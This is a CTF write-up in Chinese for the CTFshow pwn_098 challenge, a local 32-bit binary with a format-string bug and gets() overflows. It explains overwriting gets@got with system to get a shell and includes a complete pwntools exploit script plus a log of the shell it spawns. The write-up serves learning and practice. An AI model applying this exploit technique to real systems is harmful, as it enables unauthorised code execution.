# CTFshow-pwn_098
1. 题目来源：CTFshow题库（本地环境）
2. PWN + 格式化字符串（任意写）
## 解题思路
> 格式化字符串覆写 got 表 + RCE 小技巧

仅开启 NX 和 Canary 且为部分 RELRO  
```text
mrw@mrw-VMware-Virtual-Platform:~/CTFshow$ checksec ./pwn_098
[*] '/home/mrw/CTFshow/pwn_098'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```
 
漏洞函数和主函数伪代码如下   
```c
unsigned int ctfshow()
{
  char s[40]; // [esp+4h] [ebp-34h] BYREF
  unsigned int v2; // [esp+2Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  gets(s);
  printf(s);
  gets(s);
  return __readgsdword(0x14u) ^ v2;
}
int __cdecl main(int argc, const char **argv, const char **envp)
{
  init();
  logo();
  ctfshow();
  return 0;
}
```
- 程序存在两次 gets 输入，中间夹一次 printf，同时具有栈溢出和格式化字符串漏洞。另一方面程序中存在未使用的 system 函数但没有 "/bin/sh"
- 由于 Canary 我们不能直接进行 ROP
- 经过调试可以发现输入内容起始处位于第5个参数
- 可以用格式化字符串漏洞覆盖 gets@got 为 system_plt + 6，使得下一次 gets(s) 执行 system(s)。  
- payload 由设计好的格式化字符串加上 "|| /bin/sh"，这样执行 system(s) 时格式化字符串必定执行失败，由于 "||" 的存在而执行下一条命令从而触发 system("/bin/sh")  
> 本题也可以通过格式化字符串获取 Canary 后进行 ret2text，但需要考虑向程序中注入 "/bin/sh" 以及如何找到 "/bin/sh" 的地址

**exp如下**
```python
from pwn import *
p = process('./pwn_098')
#gdb.attach(p)
gets_got = 0x0804b010
system_plt = 0x08048430
payload = fmtstr_payload(5, {gets_got:system_plt+6}) + b'|| /bin/sh'
p.sendline(payload)
p.interactive()
```
## Flag
> 题目在本地运行， flag自己随便设的
运行结果如下
```text
mrw@mrw-VMware-Virtual-Platform:~/CTFshow$ python3 ./exp/pwn_098.py
[+] Starting local process './pwn_098': pid 28763
[*] Switching to interactive mode
    ▄▄▄▄   ▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄            ▄▄                           
  ██▀▀▀▀█  ▀▀▀██▀▀▀  ██▀▀▀▀▀▀            ██                           
 ██▀          ██     ██        ▄▄█████▄  ██▄████▄   ▄████▄  ██      ██
 ██           ██     ███████   ██▄▄▄▄ ▀  ██▀   ██  ██▀  ▀██ ▀█  ██  █▀
 ██▄          ██     ██         ▀▀▀▀██▄  ██    ██  ██    ██  ██▄██▄██ 
  ██▄▄▄▄█     ██     ██        █▄▄▄▄▄██  ██    ██  ▀██▄▄██▀  ▀██  ██▀ 
    ▀▀▀▀      ▀▀     ▀▀         ▀▀▀▀▀▀   ▀▀    ▀▀    ▀▀▀▀     ▀▀  ▀▀  
    * *************************************                           
    * Classify: CTFshow --- PWN --- 入门                              
    * Type  : Format_String                                           
    * Site  : https://ctf.show/                                       
    * Hint  : Find the vulnerability and then exploit it !            
    * *************************************                           
       \x00                                             4                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             \x16aaa\x13\xb0\x0\x10\xb0\x0\x11\xb0\x0|| /bin/shsh: 1: %8c%14%46c%15%1102c%16\x13\xb0\x0\x10\xb0\x0\x11\xb0\x0: not found
$ ls /
bin           dev     lib32            media  run               swap.img
bin.usr-is-merged  etc     lib64            mnt    sbin               sys
boot           flag  lib.usr-is-merged  opt    sbin.usr-is-merged  tmp
cdrom           home  libx32            proc   snap               usr
ctfshow_flag       lib     lost+found        root   srv               var
$ cat /ctfshow_flag
flag{Success!}
$ 
```
